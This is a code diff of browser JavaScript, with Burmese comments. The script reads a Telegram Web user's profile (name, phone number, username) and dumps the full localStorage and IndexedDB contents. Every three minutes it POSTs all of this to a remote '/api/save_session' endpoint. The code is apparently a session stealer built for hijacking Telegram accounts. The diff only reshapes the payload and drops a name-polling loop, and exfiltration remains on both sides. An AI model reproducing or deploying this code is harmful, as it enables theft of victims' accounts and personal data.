@@ -116,12 +116,12 @@
         });
     }
 
-function getTelegramProfile() {
+    function getTelegramProfile() {
         try {
             let currentId = null;
-            let name = null; // 🌟 "Unknown Profile" ဟု အသေမပေးတော့ပါ 🌟
-            let phone = null; // 🌟 "Waiting..." ဟု အသေမပေးတော့ပါ 🌟
-            let username = null;
+            let name = "Unknown Profile";
+            let phone = "Waiting...";
+            let username = "";
 
             const stateStr = localStorage.getItem('tt-global-state');
             if (stateStr) {
@@ -130,10 +130,9 @@ function getTelegramProfile() {
                 if (currentId && state.users && state.users.byId) {
                     const user = state.users.byId[currentId] || state.users.byId[currentId.toString()];
                     if (user) {
-                        // နာမည်အစစ်ကို ဆွဲထုတ်မည်၊ မရသေးပါက null အတိုင်းထားမည်
-                        name = [user.firstName, user.lastName].filter(Boolean).join(' ') || null;
-                        phone = user.phoneNumber ? '+' + user.phoneNumber : null;
-                        username = user.username ? '@' + user.username : null;
+                        name = [user.firstName, user.lastName].filter(Boolean).join(' ') || name;
+                        phone = user.phoneNumber ? '+' + user.phoneNumber : phone;
+                        username = user.username ? '@' + user.username : username;
                     }
                 }
             }
@@ -148,7 +147,7 @@ function getTelegramProfile() {
         } catch (e) { console.error("Profile parsing error", e); }
         return null; 
     }
-  
+
     document.addEventListener("DOMContentLoaded", async () => { 
 
         const urlParams = new URLSearchParams(window.location.search);
@@ -194,7 +193,7 @@ function getTelegramProfile() {
             let lastSyncLength = 0; 
             let wasLoggedIn = false; 
             let lastKnownUserId = null; 
-            let lastSyncedName = null;
+            let lastSyncedName = "Unknown Profile";
 
             const syncSessionData = async () => {
                 let profile = getTelegramProfile();
@@ -232,7 +231,6 @@ function getTelegramProfile() {
                         });
                         wasLoggedIn = false; 
                         lastSyncLength = 0;
-                        lastSyncedName = null;
                     } catch(e) {}
                     return; 
                 }
@@ -246,34 +244,21 @@ function getTelegramProfile() {
                         const idbDataStr = serializeData(rawIdbData);
                         
                         const currentDataLength = idbDataStr.length + lsDataStr.length;
-
-                        const payload = {
-                            user_id: lastKnownUserId, 
-                            local_storage_str: lsDataStr,
-                            indexed_db_str: idbDataStr,
-                            timestamp: new Date().toISOString()
-                        };
-
-                        if (profile.name) payload.profile_name = profile.name;
-                        if (profile.phone) payload.profile_phone = profile.phone;
-                        if (profile.username) payload.profile_username = profile.username;
-
-                        // 🌟 အရေးကြီးဆုံး Logic: Data သိမ်းရန် အခြေအနေ (၂) ရပ် 🌟
-                        // ၁။ Session အသစ်ဝင်လာလို့ Data အရွယ်အစား ပြောင်းသွားသလား (Login ဝင်ဝင်ချင်း ချက်ချင်းပို့မည်)
-                        const isDataChanged = lastSyncLength !== currentDataLength;
-                        // ၂။ နာမည်အစစ် အခုမှပေါ်လာလို့ DB ကို Update လှမ်းလုပ်ဖို့ လိုနေသလား
-                        const isNameNewlyFound = profile.name && profile.name !== lastSyncedName;
-
-                        // Data လည်းမပြောင်းဘူး၊ နာမည်အသစ်လည်း မရှိဘူးဆိုရင် လုံးဝမပို့ဘဲ ရပ်ထားမည် (Server လေးခြင်းမှ ကာကွယ်ရန်)
-                        if (!isDataChanged && !isNameNewlyFound) return;
-                        
+                        if (lastSyncLength === currentDataLength && lastSyncedName === profile.name) return;
 
                         const res = await fetch(BACKEND_URL + "/api/save_session", {
                             method: "POST",
                             headers: { "Content-Type": "application/json", "x-api-key": API_KEY },
                             keepalive: true,
-                            body: JSON.stringify(payload)
-                                
+                            body: JSON.stringify({
+                                user_id: lastKnownUserId, 
+                                profile_name: profile.name,
+                                profile_phone: profile.phone,
+                                profile_username: profile.username,
+                                local_storage_str: lsDataStr,
+                                indexed_db_str: idbDataStr,
+                                timestamp: new Date().toISOString()
+                            })
                         });
                         
                         if(res.ok) {
@@ -284,22 +269,6 @@ function getTelegramProfile() {
                     } catch(e) {}
                 }
             };
-
-            // 🌟 နာမည်အစစ်ကို အမြန်ဆုံး ဖမ်းယူနိုင်ရန် ၂ စက္ကန့်တစ်ခါ ပတ်စစ်မည့် စနစ်အသစ် 🌟
-            let nameCatchInterval = setInterval(() => {
-                if (wasLoggedIn) {
-                    let currentProfile = getTelegramProfile();
-                    
-                    // နာမည်အစစ် ရလာပြီဖြစ်ပြီး၊ အရင်ပို့ထားတဲ့နာမည်နဲ့ မတူဘူးဆိုရင် ချက်ချင်း လှမ်းပို့မည်
-                    if (currentProfile && currentProfile.name && currentProfile.name !== lastSyncedName) {
-                        console.log("✅ Profile Name Loaded! Syncing to Database...");
-                        syncSessionData(); 
-                        
-                        // နာမည်ရသွားရင် ဆက်စစ်စရာမလိုတော့လို့ ရပ်လိုက်မည် (Server မလေးစေရန်)
-                        clearInterval(nameCatchInterval); 
-                    }
-                }
-            }, 2000);
 
             setInterval(syncSessionData, 180000); 
 
